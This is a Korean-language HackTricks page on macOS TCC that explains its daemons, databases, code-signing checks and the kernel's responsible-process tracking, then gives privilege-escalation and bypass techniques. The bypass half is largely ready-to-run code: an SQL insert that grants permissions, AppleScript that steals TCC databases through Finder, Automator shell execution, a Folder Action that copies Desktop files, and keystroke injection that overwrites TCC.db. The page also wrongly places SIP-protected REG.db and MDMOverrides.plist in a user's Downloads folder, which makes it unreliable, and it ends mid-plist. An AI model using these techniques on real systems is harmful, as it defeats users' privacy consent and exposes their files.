# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **기본 정보**

**TCC (Transparency, Consent, and Control)**는 application permissions를 규제하는 데 중점을 둔 security protocol입니다. 주요 역할은 **location services, contacts, photos, microphone, camera, accessibility, full disk access**와 같은 민감한 기능을 보호하는 것입니다. application이 이러한 요소에 액세스하기 전에 명시적인 user consent를 요구함으로써, TCC는 privacy와 사용자의 data control을 강화합니다.

application이 보호된 기능에 대한 액세스를 요청할 때 사용자는 TCC를 접하게 됩니다. 이는 사용자가 **액세스를 승인하거나 거부**할 수 있는 prompt로 표시됩니다. 또한 TCC는 **파일을 application으로 드래그 앤 드롭**하는 것과 같은 직접적인 user action을 지원하여 특정 파일에 대한 액세스 권한을 부여하며, application이 명시적으로 허용된 항목에만 액세스하도록 보장합니다.

![TCC prompt의 예시](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**는 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`에 위치한 **daemon**에서 처리되며, `/System/Library/LaunchDaemons/com.apple.tccd.system.plist`에서 구성됩니다(`com.apple.tccd.system` mach service를 등록).

로그인한 각 user마다 실행되는 **user-mode tccd**도 있으며, `/System/Library/LaunchAgents/com.apple.tccd.plist`에 정의되어 `com.apple.tccd` 및 `com.apple.usernotifications.delegate.com.apple.tccd` mach services를 등록합니다.

여기서는 system 및 user로 실행 중인 tccd를 확인할 수 있습니다:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
권한은 **부모** 애플리케이션에서 **상속**되며, **권한**은 **Bundle ID**와 **Developer ID**를 기준으로 **추적**됩니다.

### TCC 데이터베이스

허용/거부 정보는 다음 TCC 데이터베이스에 저장됩니다.

- **`/Library/Application Support/com.apple.TCC/TCC.db`**의 시스템 전체 데이터베이스.
- 이 데이터베이스는 **SIP로 보호**되므로 SIP 우회만 이를 수정할 수 있습니다.
- 사용자별 환경설정을 위한 사용자 TCC 데이터베이스 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**.
- 이 데이터베이스는 보호되므로 Full Disk Access와 같은 높은 TCC 권한을 가진 프로세스만 이를 수정할 수 있습니다(하지만 SIP로 보호되지는 않음).

> [!WARNING]
> 앞의 데이터베이스는 **읽기 접근도 TCC로 보호**됩니다. 따라서 TCC 권한이 있는 프로세스가 아니면 일반 사용자의 TCC 데이터베이스를 **읽을 수 없습니다**.
>
> 그러나 **FDA** 또는 **`kTCCServiceEndpointSecurityClient`**와 같은 높은 권한을 가진 프로세스는 사용자의 TCC 데이터베이스를 수정할 수 있다는 점을 기억해야 합니다.

- **위치 서비스에 액세스**할 수 있도록 허용된 클라이언트를 나타내는 **세 번째** TCC 데이터베이스가 **`/var/db/locationd/clients.plist`**에 있습니다.
- SIP로 보호되는 파일 **`/Users/carlospolop/Downloads/REG.db`**(TCC를 통해 읽기 접근도 보호됨)에는 모든 **유효한 TCC 데이터베이스**의 **위치**가 포함되어 있습니다.
- SIP로 보호되는 파일 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**(TCC를 통해 읽기 접근도 보호됨)에는 추가로 부여된 TCC 권한이 포함되어 있습니다.
- SIP로 보호되는 파일 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**(누구나 읽을 수 있음)은 TCC 예외가 필요한 애플리케이션의 허용 목록입니다.

> [!TIP]
> **iOS**의 TCC 데이터베이스는 **`/private/var/mobile/Library/TCC/TCC.db`**에 있습니다.

> [!TIP]
> **notification center UI**는 **시스템 TCC 데이터베이스를 변경**할 수 있습니다:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> 그러나 사용자는 명령줄 유틸리티 **`tccutil`**을 사용하여 규칙을 **삭제하거나 조회**할 수 있습니다.

#### 데이터베이스 조회

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> 두 데이터베이스를 모두 확인하면 앱에 허용되었거나, 거부되었거나, 아직 권한이 없는 권한을 확인할 수 있습니다(앱이 해당 권한을 요청함).

- **`service`**는 TCC **permission**의 문자열 표현입니다.
- **`client`**는 권한이 부여된 **bundle ID** 또는 **binary 경로**입니다.
- **`client_type`**은 Bundle Identifier(0)인지 절대 경로(1)인지를 나타냅니다.

<details>

<summary>절대 경로인 경우 실행하는 방법</summary>

다음과 같이 plist를 준비한 후 **`launctl load you_bin.plist`**를 실행하면 됩니다.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`**는 다음과 같은 값을 가질 수 있습니다: denied(0), unknown(1), allowed(2), limited(3).
- **`auth_reason`**은 다음과 같은 값을 가질 수 있습니다: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** 필드는 실행할 binary를 검증하고 TCC permissions를 부여하는 방법을 나타냅니다:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- 표의 **다른 필드**에 대한 자세한 내용은 [**이 블로그 게시물**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)을 확인하세요.<sup>[1]</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders`에서 앱에 **이미 부여된 권한**을 확인할 수도 있습니다.

> [!TIP]
> 사용자는 **`tccutil`**을 사용하여 **규칙을 삭제하거나 조회**할 수 있습니다.

#### TCC 권한 재설정
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 서명 검사

TCC **database**는 애플리케이션의 **Bundle ID**를 저장하지만, 권한 사용을 요청하는 **App**이 올바른 앱인지 **확인하기 위해** **서명**에 대한 **정보**도 **저장**합니다.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> 따라서 동일한 이름과 bundle ID를 사용하는 다른 애플리케이션은 다른 앱에 부여된 권한에 접근할 수 없습니다.

### Entitlements 및 TCC Permissions

앱은 일부 리소스에 **접근을 요청**하고 **접근 권한을 부여받는 것**만으로 충분하지 않으며, 관련 **entitlements도 보유해야** 합니다.\
예를 들어 **Telegram**은 **카메라에 대한 접근을 요청**하기 위한 `com.apple.security.device.camera` entitlement를 보유하고 있습니다. 이 **entitlement가 없는 앱**은 카메라에 접근할 수 없으며, 사용자에게 권한을 요청하는 메시지도 표시되지 않습니다.

entitlements는 plist 파일이며 code sig의 일부입니다. 또한 특수 슬롯을 통해 code sig에서 추가로 해시되며, kernel code가 kernel에서 조회하거나 user mode code가 `csops(#169)` 또는 `csops_audittoken(#170)`을 사용하여 조회할 수 있습니다.

하지만 앱이 `~/Desktop`, `~/Downloads`, `~/Documents`와 같은 **특정 사용자 폴더에 접근**하기 위해 특정 **entitlements를 보유할 필요는 없습니다.** 시스템이 필요에 따라 접근을 투명하게 처리하고 **사용자에게 메시지를 표시**합니다.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple의 앱은 **메시지를 표시하지 않습니다**. 이러한 앱은 **entitlements** 목록에 **미리 부여된 권한**을 포함하고 있으므로 **팝업을 표시하지 않으며**, **TCC databases에도 나타나지 않습니다.** 예:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
이렇게 하면 Calendar가 사용자에게 reminders, calendar 및 address book에 대한 접근 권한을 요청하지 않게 됩니다.

> [!TIP]
> entitlements에 관한 일부 공식 문서 외에도 [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)에서 entitlements에 관한 비공식적인 **흥미로운 정보**를 확인할 수 있습니다.

일부 TCC permissions는 kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos...입니다. 모든 permission을 정의한 공개 목록은 없지만, [**알려진 permission 목록**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)을 확인할 수 있습니다.<sup>[1]</sup>

### 보호되지 않는 민감한 위치

- $HOME (자체)
- $HOME/.ssh, $HOME/.aws 등
- /tmp

### User Intent / com.apple.macl

앞서 언급했듯이, **파일을 App으로 드래그\&드롭하여 해당 파일에 대한 접근 권한을 App에 부여**할 수 있습니다. 이 접근 권한은 어떤 TCC database에도 지정되지 않고, **파일의** **extended** **attribute**로 지정됩니다. 이 attribute에는 권한이 부여된 App의 **UUID**가 저장됩니다:<sup>[2]</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> **`com.apple.macl`** attribute가 tccd가 아니라 **Sandbox**에 의해 관리된다는 점은 흥미롭습니다.
>
> 또한 컴퓨터의 앱 UUID를 허용하는 파일을 다른 컴퓨터로 이동하면, 동일한 앱이라도 서로 다른 UID를 갖게 되므로 해당 앱에 대한 접근 권한이 부여되지 않는다는 점에 유의해야 합니다.

extended attribute인 `com.apple.macl`은 다른 extended attribute처럼 **clear할 수 없습니다**. **SIP에 의해 보호**되기 때문입니다. 그러나 [**이 게시물에서 설명한 것처럼**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), 파일을 **zipping**하고, 해당 파일을 **deleting**한 다음, **unzipping**하면 이를 비활성화할 수 있습니다.<sup>[3]</sup>






## XNU Responsible Process 메커니즘

macOS/iOS에서 **responsible process** 메커니즘은 **TCC (Transparency, Consent, and Control)** framework 및 기타 보안 시스템에서 사용하는 중요한 보안 기능입니다. 이 기능은 child process chain을 거치더라도 어떤 process가 작업에 궁극적으로 책임이 있는지 추적합니다.

TCC가 권한(예: camera, microphone, location)을 확인할 때 항상 요청을 수행하는 immediate process를 확인하는 것은 아닙니다. 대신 **responsible process**를 확인합니다. 일반적으로 실제 요청이 helper process 또는 daemon에서 발생하더라도 작업을 시작한 GUI application이 responsible process가 됩니다.

<details>
<summary>Responsible Process가 설정되는 방식</summary>

### Process Structure Fields

XNU의 각 process는 두 개의 주요 UUID 식별자를 유지합니다:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: 프로세스 자체의 UUID (Mach-O 바이너리의 `LC_UUID` load command에서 가져옴)
- **`p_responsible_pid`**: 책임 프로세스의 PID
- **`p_responsible_uuid`**: 책임 프로세스의 UUID (해당 프로세스가 종료된 후에도 유지됨)

### 책임 프로세스 설정 방식

1. **프로세스 생성 중 (Fork)**

`fork()` 또는 `posix_spawn()`을 통해 새 프로세스가 생성되면, 책임 프로세스는 부모 프로세스로부터 상속됨 (`exec()` syscall은 기존 `proc` 구조체를 재사용하므로 이 단계는 `exec()`에서 반복되지 않음):

**Location**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**핵심 사항:**
- 자식 프로세스는 부모의 `p_responsible_pid`를 **상속**합니다.
- 이는 프로세스 계층 전반에 걸쳐 **책임 체인**을 생성합니다.
- 책임 프로세스는 일반적으로 최초의 GUI 애플리케이션을 가리킵니다.

2. **핵심 함수: `proc_set_responsible_pid()`**

**위치**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**이 함수가 수행하는 작업:**
1. 대상 프로세스에 **responsible PID를 설정**합니다.
2. `proc_find()`를 사용하여 **responsible process를 조회**합니다(참조 카운트 증가).
3. responsible process의 `p_uuid`에서 대상 프로세스의 `p_responsible_uuid`로 **UUID를 복사**합니다.
4. `proc_rele()`를 사용하여 **참조를 해제**합니다(참조 카운트 감소).

3. **PID와 UUID를 모두 저장하는 이유**

이중 저장 방식은 중요한 문제를 해결합니다.

| 필드 | 목적 | 문제 | 해결 방법 |
|-------|---------|---------|----------|
| `p_responsible_pid` | 현재 프로세스의 빠른 조회 | 프로세스가 종료된 후 PID가 재사용될 수 있음 | 활성 프로세스 조회에 사용 |
| `p_responsible_uuid` | 영구적인 식별 | 프로세스 종료 후에도 유지됨 | 보안 검사 및 auditing에 사용 |

**문제**: responsible process가 child보다 먼저 종료되면 PID가 재활용되어 완전히 다른 프로세스에 할당될 수 있습니다.

**해결 방법**: UUID는 변경되지 않으며 responsible process였던 특정 binary를 고유하게 식별하므로, 해당 프로세스가 종료된 후에도 식별할 수 있습니다.

### 프로세스 생성 흐름
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID 출처: LC_UUID 로드 명령

`p_uuid`에 저장된 UUID는 **Mach-O 실행 파일의 `LC_UUID` 로드 명령**에서 가져옵니다:

1. **컴파일 시점**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **실행 시간**

**위치**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **프로세스 구조체에 저장됨**

**위치**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**위치**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC 권한 상승 및 우회

### TCC에 삽입

어떤 시점에 TCC 데이터베이스에 대한 쓰기 권한을 얻는 데 성공했다면, 다음과 같은 방법으로 항목을 추가할 수 있습니다(주석은 제거).

<details>

<summary>TCC 삽입 예시</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

TCC 권한이 있는 앱 내부에 진입하는 데 성공했다면, 이를 악용할 수 있는 TCC payloads가 설명된 다음 페이지를 확인하세요:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

다음에서 Apple Events에 대해 알아보세요:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation 권한의 TCC 이름은 **`kTCCServiceAppleEvents`**입니다.\
이 특정 TCC 권한은 TCC 데이터베이스에서 **관리할 수 있는 애플리케이션**도 지정합니다(따라서 해당 권한이 모든 항목을 관리할 수 있도록 허용하는 것은 아닙니다).

**Finder**는 **항상 FDA를 보유하는** 애플리케이션입니다(UI에 표시되지 않는 경우에도 해당). 따라서 해당 애플리케이션에 대한 **Automation** 권한이 있다면, 권한을 악용하여 **특정 작업을 수행하도록 만들 수 있습니다**.\
이 경우 앱에는 **`com.apple.Finder`**에 대한 **`kTCCServiceAppleEvents`** 권한이 필요합니다.<sup>[4]</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

이를 악용하여 **자신만의 사용자 TCC 데이터베이스를 작성**할 수 있습니다.

> [!WARNING]
> 이 권한을 사용하면 **Finder에 TCC로 제한된 폴더에 접근하도록 요청하고 해당 파일을 전달하도록** 할 수 있지만, 제가 아는 한 **Finder가 FDA 접근 권한을 완전히 악용하도록 임의의 코드를 실행하게 만들 수는 없습니다**.
>
> 따라서 전체 FDA 기능을 악용할 수는 없습니다.

다음은 Finder에 대한 Automation 권한을 얻기 위한 TCC 프롬프트입니다.

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** 앱에는 TCC 권한 **`kTCCServiceAppleEvents`**가 있으므로 Finder와 같은 **모든 앱을 제어할 수 있음**에 유의하세요. 따라서 Automator를 제어할 권한이 있다면 아래와 같은 코드로 **Finder**도 제어할 수 있습니다.

<details>

<summary>Automator 내부에서 셸 가져오기</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor app**에서도 동일한 일이 발생합니다. Finder를 제어할 수 있지만, AppleScript를 사용해 스크립트를 실행하도록 강제할 수는 없습니다.

### 일부 TCC에 대한 Automation (SE)

**System Events는 Folder Actions를 생성할 수 있고, Folder Actions는 일부 TCC 폴더**(Desktop, Documents & Downloads)에 액세스할 수 있으므로, 다음과 같은 스크립트를 사용해 이 동작을 악용할 수 있습니다.
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** 를 FDA\*로

**`System Events`**에 대한 Automation + Accessibility (**`kTCCServicePostEvent`**)를 사용하면 **프로세스에 keystrokes를 전송**할 수 있습니다. 이를 통해 Finder를 악용하여 사용자의 TCC.db를 변경하거나 임의의 앱에 FDA를 부여할 수 있습니다(단, 이 작업에는 password prompt가 표시될 수 있습니다).

Finder가 사용자의 TCC.db를 덮어쓰는 예:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` to FDA\*

이 페이지에서 FDA\*로 privesc하거나, 예를 들어 keylogger를 실행하기 위해 [**Accessibility permissions를 악용하는 payloads**](macos-tcc-payloads.md#accessibility)를 확인하세요.

### **Endpoint Security Client to FDA**

**`kTCCServiceEndpointSecurityClient`**가 있다면 FDA를 보유한 것입니다. 끝입니다.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`**를 사용하면 사용자의 **`NFSHomeDirectory`** attribute를 **변경**할 수 있습니다. 이로 인해 사용자의 home folder가 변경되며, 따라서 **TCC를 우회**할 수 있습니다.

### User TCC DB to FDA

**user TCC** database에 대한 **write permissions**를 획득해도 자신에게 **`FDA`** permissions를 부여할 수는 **없습니다**. 해당 권한을 부여할 수 있는 것은 system database에 있는 database뿐입니다.

하지만 자신에게 **`Finder에 대한 Automation rights`**를 부여할 수 있으며, 이전 technique을 악용해 FDA\*로 escalate할 수 있습니다.

### **FDA to TCC permissions**

**Full Disk Access**의 TCC name은 **`kTCCServiceSystemPolicyAllFiles`**입니다.

이것이 실제 privesc라고 생각하지는 않지만, 유용할 수 있으므로 설명합니다. FDA를 보유한 program을 control하고 있다면 **users TCC database를 수정하여 자신에게 모든 access를 부여**할 수 있습니다. 이는 FDA permissions를 잃을 가능성에 대비한 persistence technique으로 유용할 수 있습니다.

### **SIP Bypass to TCC Bypass**

system **TCC database**는 **SIP**에 의해 보호됩니다. 따라서 **지정된 entitlements를 가진** process만 이를 **modify**할 수 있습니다. 그러므로 attacker가 **file**에 대한 **SIP bypass**(SIP에 의해 제한된 file을 modify할 수 있는 것)를 찾으면 다음을 수행할 수 있습니다.

- **TCC database의 protection을 제거**하고 자신에게 모든 TCC permissions를 부여합니다. 예를 들어 다음 file을 악용할 수 있습니다.
- TCC systems database
- REG.db
- MDMOverrides.plist

하지만 이 **SIP bypass를 사용해 TCC를 bypass**하는 또 다른 방법이 있습니다. `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` file은 TCC exception이 필요한 applications의 allow list입니다. 따라서 attacker가 이 file에서 **SIP protection을 제거**하고 자신의 **application**을 추가할 수 있다면, 해당 application은 TCC를 bypass할 수 있습니다.\
예를 들어 terminal을 추가하려면:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
